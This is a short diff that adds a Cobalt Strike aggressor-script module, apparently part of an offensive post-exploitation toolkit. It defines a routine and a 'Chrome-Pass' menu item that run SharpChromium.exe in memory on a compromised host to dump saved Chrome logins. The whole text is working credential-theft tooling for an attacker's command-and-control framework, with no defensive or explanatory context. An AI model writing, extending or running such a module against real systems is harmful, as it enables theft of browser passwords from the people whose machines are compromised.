@@ -1,0 +1,8 @@
+sub chrome_password{
+		bexecute_assembly($bid, script_resource("modules/SharpChromium.exe"), "logins");
+	
+}
+	item "Chrome-Pass"{
+		$bid = $1['@'];
+                  chrome_password($bid);
+            }
